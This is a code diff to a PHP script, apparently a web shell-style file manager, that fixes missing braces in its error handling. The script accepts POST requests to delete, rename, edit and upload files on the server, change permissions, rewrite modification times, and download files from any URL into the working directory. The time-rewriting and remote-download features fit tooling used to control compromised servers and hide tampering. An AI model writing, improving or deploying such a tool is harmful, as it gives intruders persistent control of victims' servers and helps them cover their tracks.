@@ -73,13 +73,13 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
                 $target=$path.'/'.$t;
                 if(is_dir($target)?rmdir($target):unlink($target)){
                     $_SESSION['msg']='Deleted successfully'; $_SESSION['msg_type']='success';
-                } else $_SESSION['msg']='Delete failed'; $_SESSION['msg_type']='error';
+                } else{ $_SESSION['msg']='Delete failed'; $_SESSION['msg_type']='error'; }
             }
         }
         elseif (isset($_POST['rename_from'],$_POST['rename_to'])){
             if(rename($path.'/'.basename($_POST['rename_from']),$path.'/'.basename($_POST['rename_to']))){
                 $_SESSION['msg']='Renamed successfully'; $_SESSION['msg_type']='success';
-            } else $_SESSION['msg']='Rename failed'; $_SESSION['msg_type']='error';
+            } else{ $_SESSION['msg']='Rename failed'; $_SESSION['msg_type']='error'; }
         }
         elseif (isset($_POST['edit_file'],$_POST['content'])){
             $edit = basename($_POST['edit_file']);
@@ -88,7 +88,7 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             } else {
                 if(file_put_contents($path.'/'.$edit,$_POST['content'])!==false){
                     $_SESSION['msg']='Saved successfully'; $_SESSION['msg_type']='success';
-                } else $_SESSION['msg']='Save failed'; $_SESSION['msg_type']='error';
+                } else{ $_SESSION['msg']='Save failed'; $_SESSION['msg_type']='error'; }
             }
         }
         elseif (isset($_FILES['files'])){
@@ -101,13 +101,13 @@ if ($_SERVER['REQUEST_METHOD'] == 'POST') {
             $file=$path.'/'.basename($_POST['update_perm']);
             if(@chmod($file, octdec($_POST['perm_value']))){
                 $_SESSION['msg']='Permission updated'; $_SESSION['msg_type']='success';
-            } else $_SESSION['msg']='Update permission failed'; $_SESSION['msg_type']='error';
+            } else{ $_SESSION['msg']='Update permission failed'; $_SESSION['msg_type']='error'; }
         }
         elseif (isset($_POST['update_mtime'],$_POST['mtime_value'])){
             $file=$path.'/'.basename($_POST['update_mtime']);
             if(@touch($file, strtotime($_POST['mtime_value']))){
                 $_SESSION['msg']='Modified time updated'; $_SESSION['msg_type']='success';
-            } else $_SESSION['msg']='Update failed'; $_SESSION['msg_type']='error';
+            } else{ $_SESSION['msg']='Update failed'; $_SESSION['msg_type']='error'; }
         }
         elseif (isset($_POST['download_url'],$_POST['output_name'],$_POST['method'])){
             $url=trim($_POST['download_url']); $out=$path.'/'.basename($_POST['output_name']); $method=$_POST['method'];
